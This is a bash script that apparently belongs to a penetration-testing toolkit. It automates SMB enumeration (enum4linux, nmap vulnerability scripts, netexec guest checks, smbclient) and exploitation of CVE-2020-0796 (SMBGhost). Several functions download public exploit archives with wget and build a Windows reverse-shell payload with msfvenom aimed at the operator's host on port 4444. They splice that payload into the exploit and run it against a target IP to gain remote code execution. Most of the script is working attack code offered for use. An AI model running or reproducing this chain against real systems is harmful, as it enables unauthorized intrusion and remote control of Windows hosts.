#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

smb_enumerate() {
    local command=""
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using $target_ip"        
    fi
    if [[ ! -f "log/enum4linux_$target_ip.log" ]]; then        
        command="enum4linux $target_ip"
        echo "$command" | tee -a "$trail_log"
        eval "$command" | tee -a "log/enum4linux_$target_ip.log"
    fi
    if [[ ! -f "log/nmap_smb_enum_$target_ip.log" ]]; then
        echo "Running nmap SMB enumeration scripts against $target_ip"
        #nmap -p 139,445 --script=smb-enum*,smb-os*,smb-vuln* $target_ip -oN "log/nmap_smb_enum_$target_ip.log"
        local command="nmap -p 139,445 --script=smb-enum*,smb-os*,smb-vuln* $target_ip -oN \"log/nmap_smb_enum_$target_ip.log\""
        echo "$command" | tee -a "$trail_log"
        eval "$command"
    fi
    test_anonymous_smb

}

check_for_smb311() {

     if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using $target_ip"        
    fi
    if [[ ! -f "$log_dir//nmap_smb_cve_2020_0796_$target_ip.log" ]]; then        
        #nmap -p445 --script smb-protocols -Pn -n $target_ip | grep -P '\d+\.\d+\.\d+\.\d+|^\|.\s+3.11' | tr '\n' ' ' | replace 'Nmap scan report for' '@' | tr "@" "\n" | grep 3.11 | tr '|' ' ' | tr '_' ' ' | grep -oP '\d+\.\d+\.\d+\.\d+' | tee -a "$log_dir//nmap_smb_cve_2020_0796_$target_ip.log"
        local command="nmap -p445 --script smb-protocols -Pn -n $target_ip"
        echo "$command"
        eval "$command" | grep -P '\d+\.\d+\.\d+\.\d+|^\|.\s+3.11' | tr '\n' ' ' | replace 'Nmap scan report for' '@' | tr "@" "\n" | grep 3.11 | tr '|' ' ' | tr '_' ' ' | grep -oP '\d+\.\d+\.\d+\.\d+' | tee -a "$log_dir//nmap_smb_cve_2020_0796_$target_ip.log"
        if [[ $? -ne 0 ]]; then
            echo "No hosts with SMBv3.11 found, " | tee -a "$log_dir//nmap_smb_cve_2020_0796_$target_ip.log"
            return 0
        else
            echo "Host $target_ip is running SMBv3.11" | tee -a "$log_dir//nmap_smb_cve_2020_0796_$target_ip.log"
        fi
    fi
}

test_anonymous_smb() {
    if [[ -z $target_ip ]]; then
        echo "Target IP is not set. Please set the target_ip variable."
        return 1
    fi
    echo 'Testing anonymous SMB access...'
    if [[ ! -f "log/anonymous_smb_$target_ip.log" ]]; then
        local guest=$(netexec smb "$target_ip" -u test -p test | grep Guest)
        if [[ ! -z "$guest" ]]; then
            echo "Anonymous SMB access is allowed on $target_ip" | tee -a "$log_dir//anonymous_smb_$target_ip.log"
            #netexec smb "$target_ip" -u test -p test --shares | tee -a "$log_dir//anonymous_smb_$target_ip.log"
            local command="netexec smb \"$target_ip\" -u test -p test --shares"
            echo "$command" | tee -a "$trail_log"
            eval "$command" | tee -a "$log_dir//anonymous_smb_$target_ip.log"


        else
            echo "Anonymous SMB access is NOT allowed on $target_ip" | tee -a "$log_dir//anonymous_smb_$target_ip.log"

        fi
    else
        echo "Anonymous SMB test log already exists for $target_ip, skipping test."
    fi

}

run_smbclient() {

    local command=$1    
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using $target_ip"
    fi
    if [[ -z $smb_share ]]; then
        smb_share="IPC$"
        echo "SMB share is not set, using default share: $smb_share"
    fi
    local smb_authentication=""
    if [[ ! -z $username ]] && [[ ! -z $password ]]; then
        smb_authentication="-U $username%$password"
    elif [[ ! -z $username ]] && [[ -z $password ]]; then
        smb_authentication="-U $username --no-pass"
    else
        smb_authentication="-N"
    fi
    if pgrep -f "smbclient //$target_ip/$smb_share"; then
        echo "smbclient session to //$target_ip/$smb_share already running"
        return 0
    fi    
    if [[ ! -z $command ]]; then
        command="-c \"$command\""
    fi
    local command_string="smbclient \"//$target_ip/$smb_share\" $smb_authentication $command"
    echo "$command_string" | tee -a $trail_log
    eval "$command_string" | tee >(remove_color_to_log >> "$log_dir//smbclient_$target_ip.log")

}


perform_cve_2020_0796_() {
    local cve_dir="CVE-2020-0796"
    local url="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/48537.zip"
    if [[ ! -d $cve_dir ]]; then
        echo "Downloading CVE-2020-0796 exploit..."
        wget $url -O cve_2020_0796.zip
        unzip cve_2020_0796.zip -d .
        mv SMBGhost_RCE_PoC-92c9f46e46334c3bc3645ace3014622efd11704a $cve_dir
        rm cve_2020_0796.zip
    else
        echo "$cve_dir directory already exists, skipping download."
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using $target_ip"        
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "Host IP is not set, using $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port="4444"
        echo "Host port is not set, using default port $host_port"
    fi
    pushd $cve_dir || exit 1
    msfvenom -p windows/shell_reverse_tcp LHOST=$host_ip LPORT=$host_port -f python -o shellcode.txt    
    sed -E -i 's/buf/USER_PAYLOAD/g' shellcode.txt
    sed -E -i '/USER_PAYLOAD = /d' shellcode.txt
    awk '
        /USER_PAYLOAD = / {
            print 
            while (getline line) {
                if (line ~ /^USER_PAYLOAD/) {
                    continue
                }
                next
            }
        }
        { print }
    ' exploit.py > temp.py 
    sed -E -i '/USER_PAYLOAD = /r shellcode.txt' temp.py
    if ! is_listener_connected; then
        python3 temp.py -ip $target_ip | tee -a "../log/cve_2020_0796_$target_ip.log"
    fi
    popd || exit 1

}

perform_cve_2020_0796() {
    local cve_dir="CVE-2020-0796"
    local url="https://github.com/jamf/CVE-2020-0796-RCE-POC/archive/refs/heads/master.zip"
    if [[ ! -d $cve_dir ]]; then
        echo "Downloading CVE-2020-0796 exploit..."
        wget $url -O cve_2020_0796.zip
        unzip cve_2020_0796.zip -d .
        mv CVE-2020-0796-RCE-POC-master $cve_dir
        rm cve_2020_0796.zip
    else
        echo "$cve_dir directory already exists, skipping download."
    fi    
    zip -r tools.zip $cve_dir/tools $cve_dir/calc_target_offsets.bat $cve_dir/SMBleedingGhost.py
    generate_windows_download "tools.zip"
    generate_windows_unzip "tools.zip" 
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using $target_ip"        
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "Host IP is not set, using $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port="4444"
        echo "Host port is not set, using default port $host_port"
    fi
    pushd $cve_dir || return 1
    if ! is_listener_connected; then
        echo "Running CVE-2020-0796 exploit against $target_ip..."
        wine python SMBleedingGhost.py $target_ip $host_ip $host_port | tee -a "../log/cve_2020_0796_$target_ip.log"
    fi
    popd || return 1    
}

perform_cve_2020_0796_auto() {
    local cve_dir="CVE-2020-0796"
    local url="https://github.com/Barriuso/SMBGhost_AutomateExploitation/archive/refs/heads/master.zip"
    if [[ ! -d $cve_dir ]]; then
        echo "Downloading CVE-2020-0796 exploit..."
        wget $url -O cve_2020_0796_auto.zip
        unzip cve_2020_0796_auto.zip -d .
        mv SMBGhost_AutomateExploitation-master $cve_dir
        rm cve_2020_0796_auto.zip
    else
        echo "$cve_dir directory already exists, skipping download."
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using $target_ip"        
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "Host IP is not set, using $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port="4444"
        echo "Host port is not set, using default port $host_port"
    fi
    pushd $cve_dir || return 1
    if ! is_listener_connected; then
        echo "Running CVE-2020-0796 exploit against $target_ip..."
        #msfvenom -p windows/shell_reverse_tcp LHOST=$host_ip LPORT=$host_port -f python -o shellcode.txt    
        python3 Smb_Ghost.py -i $target_ip --lhost $host_ip --lport $host_port --arch x86 -e | tee -a "../log/cve_2020_0796_auto_$target_ip.log"
    fi
    popd || return 1

}